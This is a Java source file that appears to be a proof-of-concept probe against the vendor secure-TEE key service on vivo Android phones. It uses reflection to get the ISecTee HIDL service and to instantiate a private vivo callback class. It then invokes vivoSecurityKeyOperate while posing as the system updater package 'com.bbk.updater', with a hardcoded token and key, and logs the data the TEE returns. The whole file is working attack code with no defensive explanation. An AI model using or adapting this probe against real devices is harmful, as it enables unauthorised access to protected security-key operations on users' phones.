import java.lang.reflect.*;
import java.nio.ByteBuffer;
import java.util.ArrayList;

public class DfpProbe3 {
    static final String CONFIG = "IBkgIP8PAAgAAAAAVQ2DoXJB_jfvXfvucHppveENtBpK5gcKotYxl6p8JSuKO478LZSUXxzfnD4UyzrGQHd3DQdNvtrsxSl2jsiZV29eHisERdXEfFR7EKwdXWy1le0khrF-4E7G06gzpppxFQQz8dA6X3A1AlRu7ELRiaF4XQubsDJu8WOhNGaqGpK0RepcyVbjfwy-7V-sknKcjQ5jEDh7gxKXvaF6tK5-G8Q0SRek4LGSae4bgSLvG4TrzYNFe-bFOC0rw2Pw_Gxy63ypx18sLgx21JZnNZ5sbI2RGwiVeKRM6vuI401OAw6w8CvsYqgyOYmWZhEA30_2vvZzNzfNHjmxIWF_CaBUkg==";
    static final String PUBKEY_B64 = "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEArH6tTQEDtKMyyYE+E/sBaHJK+UTANlh70HJbYyhQ2yNjBUjeEMFKh23FBTEWbIirtXN34hkzZPj8vH4ULtxjGOn79aybb/amhxI7ZFpXqHpoh9c+awK/Soqa+v4w8GG4ow7jwCvF4DVAkVgmYtXIvfFXtdcFEL3KGKdZs4B7lovXgrZGWcs+AouO15leSnyRmGozjB0lEYwtZM23WslMALJF4i6m5k0+TZTyMge8XBjRlH2l6ci0fj4NMZSkKMHqoFWdiOTXprNRPWhHJE7k1U5rFKkgCr4A0GhbZLEV7nQJ8E0ZRLeao7ohcUw+w87twGOz6bCCGRSAnBvw2jziQIBAw==";

    static void L(String m) { android.util.Log.i("DFPX3", m); System.out.println(m); }

    static byte[] wrap(byte[] b) {
        ByteBuffer bb = ByteBuffer.allocate(4224);
        byte[] copy = new byte[4096];
        bb.putInt(8193);
        System.arraycopy(b, 0, copy, 0, Math.min(b.length, 4096));
        bb.putInt(b.length);
        bb.put(copy);
        return bb.array();
    }

    public static void main(String[] args) {
        try { System.setOut(new java.io.PrintStream(new java.io.FileOutputStream(java.io.FileDescriptor.out), true)); } catch (Throwable t) {}
        try { run(); } catch (Throwable t) { L("FATAL " + t); t.printStackTrace(System.out); }
    }

    static void run() throws Exception {
        // Step 1: HIDL getService
        Class<?> hidlCls = Class.forName("vendor.vivo.hardware.sectee.V1_0.ISecTee");
        L("HIDL class ok");
        Method getService = hidlCls.getMethod("getService");
        Object svc = getService.invoke(null);
        L("HIDL getService -> " + (svc == null ? "null" : svc.getClass().getName()));
        if (svc == null) return;

        // Step 2: reuse vivo's own HIDL callback class
        Class<?> cbCls = Class.forName("com.vivo.services.cipher.utils.SecurityKeyProxy$HidlSecKeyOpCB");
        Constructor<?> ctor = cbCls.getDeclaredConstructor();
        ctor.setAccessible(true);
        Object cb = ctor.newInstance();
        L("callback instance ok: " + cb.getClass().getName());

        // Step 3: find the operate method
        Method target = null;
        StringBuilder sig = new StringBuilder();
        for (Method m : svc.getClass().getMethods()) {
            if (m.getName().equals("vivoSecurityKeyOperate")) {
                for (Class<?> pt : m.getParameterTypes()) sig.append(pt.getSimpleName()).append(" ");
                if (sig.toString().contains("ISecurityKeyCB")) { target = m; break; }
            }
        }
        L("method=" + (target != null) + " params=[" + sig + "]");
        if (target == null) return;

        // Step 4: build args
        String json = "{\"pacakage_name\":\"com.bbk.updater\",\"app_hash\":\"hash_null\",\"token\":\"" + CONFIG + "\",\"time\":\"" + System.currentTimeMillis() + "\"}";
        byte[] payload = wrap(json.getBytes("UTF-8"));
        ArrayList<Byte> list = new ArrayList<>(payload.length);
        for (byte b : payload) list.add(b);

        try {
            Object ret = target.invoke(svc, 2, 11, -1, 0, "com.bbk.updater", 0, null, PUBKEY_B64, list, payload.length, cb);
            L("STEP ret=" + ret);
        } catch (InvocationTargetException ite) {
            Throwable c = ite.getCause();
            L("EXC " + c.getClass().getName() + " : " + c.getMessage());
        }

        // Step 5: read result from callback
        try {
            Method getResult = cbCls.getMethod("getResult");
            Object result = getResult.invoke(cb);
            L("getResult=" + result);
            if (result != null) {
                Method toBA = result.getClass().getMethod("toByteArray");
                byte[] out = (byte[]) toBA.invoke(result);
                if (out != null && out.length >= 24) {
                    ByteBuffer bb = ByteBuffer.wrap(out);
                    int code = bb.getInt(); int l1 = bb.getInt();
                    byte[] d1 = new byte[Math.max(0, l1)];
                    if (l1 > 0 && l1 <= bb.remaining()) bb.get(d1);
                    L("RESULT code=" + code + " l1=" + l1);
                    if (d1.length >= 8) {
                        ByteBuffer ob = ByteBuffer.wrap(d1);
                        int skip = ob.getInt(); int len2 = ob.getInt();
                        byte[] inner = new byte[Math.min(Math.max(0, len2), d1.length - 8)];
                        ob.get(inner, 0, inner.length);
                        L("OPDATA=" + new String(inner, "UTF-8"));
                    }
                } else {
                    L("result bytes=" + (out == null ? "null" : out.length));
                }
            }
        } catch (Throwable t) { L("getResult-fail " + t); }
    }
}
